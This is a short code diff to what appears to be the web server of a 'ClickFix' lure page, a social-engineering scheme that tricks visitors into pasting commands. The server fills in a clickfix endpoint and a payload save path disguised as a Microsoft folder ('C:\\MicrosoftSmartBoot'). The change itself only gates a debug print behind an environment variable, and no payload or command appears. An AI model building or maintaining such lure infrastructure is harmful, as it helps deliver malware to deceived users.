@@ -55,7 +55,7 @@ async def root_route(req:Request):
     html = html.replace('{{CLICK_FIX_PAGE}}',config.conf["URLS"]["clickfix_page_endpoint"])
     html = html.replace("{{Payload Save Path In UserDisk}}","C:\\\\MicrosoftSmartBoot")
     html = html.replace("{{Fav-Icon-URL-Placeholder}}",config.conf["URLS"]["favicon_url"])
-    print(html)
+    if os.environ.get("VERBOSE_DEBUG",None):print(html)
     return HTMLResponse(
       html  
     )
